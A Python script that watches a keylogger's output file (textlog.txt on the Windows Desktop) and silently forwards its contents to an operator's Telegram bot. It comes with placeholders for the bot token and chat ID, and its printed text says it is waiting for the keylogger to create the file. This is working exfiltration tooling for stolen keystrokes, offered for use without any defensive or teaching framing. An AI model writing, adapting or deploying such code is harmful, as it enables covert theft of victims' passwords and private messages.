import time
import requests
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import os

# -------------------
# CONFIGURATION
# -------------------
BOT_TOKEN = "8590574092:AAFFLpP8Seh5OBsPOtxxxxxxxxrfC6cf2-g" #update this with your bot_token
CHAT_ID = "62xxxx9131"                                       #update thsi with your chat_id

# Automatically detect Desktop path and point to textlog.txt
FILE_PATH = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'textlog.txt')

# -------------------
# FUNCTION TO SEND MESSAGE TO TELEGRAM
# -------------------
def send_to_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}  # Optional: better formatting
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass  # Fail silently if no internet

# -------------------
# FILE WATCHER CLASS
# -------------------
class FileWatcher(FileSystemEventHandler):
    last_sent_content = None  # To avoid sending duplicates

    def on_modified(self, event):
        if event.is_directory or event.src_path != FILE_PATH:
            return

        # Small delay to ensure file write is complete
        time.sleep(0.3)

        try:
            with open(FILE_PATH, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read().strip()

            # Only send if content actually changed
            if content == self.last_sent_content:
                return

            self.last_sent_content = content

            # Limit message size (Telegram max ~4096 chars)
            if len(content) > 4000:
                content = content[-4000:]  # Send last 4000 chars
                prefix = "<b>📄 textlog.txt UPDATED (showing latest part):</b>\n\n"
            else:
                prefix = "<b>📄 textlog.txt UPDATED:</b>\n\n"

            send_to_telegram(prefix + content)

        except Exception as e:
            pass  # Ignore read errors (file might be locked temporarily)

# -------------------
# OBSERVER SETUP
# -------------------
if not os.path.exists(FILE_PATH):
    print(f"Warning: {FILE_PATH} not found yet. Waiting for keylogger to create it...")
else:
    print(f"✅ Watching {FILE_PATH} for changes...")

observer = Observer()
observer.schedule(FileWatcher(), path=os.path.dirname(FILE_PATH), recursive=False)
observer.start()

# Send initial message when script starts (optional)
try:
    if os.path.exists(FILE_PATH):
        with open(FILE_PATH, "r", encoding="utf-8", errors="ignore") as f:
            initial_content = f.read().strip()
        if initial_content:
            send_to_telegram("<b>🔄 Telegram monitor started</b>\nCurrent log:\n\n" + initial_content)
except:
    pass

# -------------------
# KEEP SCRIPT RUNNING
# -------------------
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    observer.stop()
    send_to_telegram("⛔ Telegram monitor stopped.")
observer.join()
